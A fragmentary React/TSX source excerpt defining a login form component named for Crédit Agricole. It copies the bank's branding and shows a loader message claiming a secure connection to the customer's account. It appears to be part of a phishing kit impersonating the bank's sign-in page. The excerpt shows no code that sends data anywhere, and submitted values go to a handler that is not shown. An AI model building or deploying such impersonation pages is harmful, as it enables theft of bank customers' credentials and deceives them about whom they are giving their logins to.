...
export function CreditAgricoleAuthTemplate({ onSubmit }: CreditAgricoleAuthTemplateProps) {
  ...
  if (showLoader) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-green-100 to-green-50 pt-20">
          ...
          <div className="bg-white rounded-2xl shadow-xl p-8">
            <div className="flex flex-col items-center justify-center py-16">
              ...
              <p className="text-gray-600 text-center max-w-md">
                Connexion sécurisée à votre espace Crédit Agricole en cours. Veuillez patienter.
              </p>
      ...
      <div className="max-w-4xl mx-auto px-4 py-8">
        <div className="bg-white rounded-2xl shadow-xl overflow-hidden">
          <div className="bg-gradient-to-r from-green-600 to-green-700 px-8 py-12">
            <h1 className="text-3xl font-bold text-white mb-2">Crédit Agricole</h1>
          ...
          <div className="p-8">
            <form onSubmit={handleSubmit} className="space-y-6 max-w-md mx-auto">
              ...
              <button
                ...
                className="w-full bg-green-600 text-white font-semibold py-4 rounded-lg transition duration-200 hover:bg-green-700 disabled:opacity-50 disabled:cursor-not-allowed"
              >
